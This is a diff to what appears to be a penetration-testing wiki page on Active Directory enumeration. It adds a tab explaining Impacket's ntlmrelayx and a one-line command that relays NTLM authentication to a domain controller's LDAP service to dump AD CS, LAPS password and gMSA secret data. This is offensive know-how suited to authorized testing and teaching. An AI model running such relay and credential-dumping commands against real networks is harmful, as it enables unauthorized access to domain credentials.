@@ -39,6 +39,14 @@ windapsearch --dc $DomainController --module metadata
 ldapdomaindump --user 'DOMAIN\USER' --password $PASSWORD --outdir ldapdomaindump $DOMAIN_CONTROLLER
 ```
 {% endtab %}
+
+{% tab title="ntlmrelayx" %}
+With [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python), it is possible to gather lots of information regarding the domain users and groups, the computers, [ADCS](../movement/ad-cs/), etc. through a [NTLM authentication relayed](../movement/ntlm/relay.md) within an LDAP session.
+
+```bash
+ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa
+```
+{% endtab %}
 {% endtabs %}
 
 [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) also has useful modules that can be used to
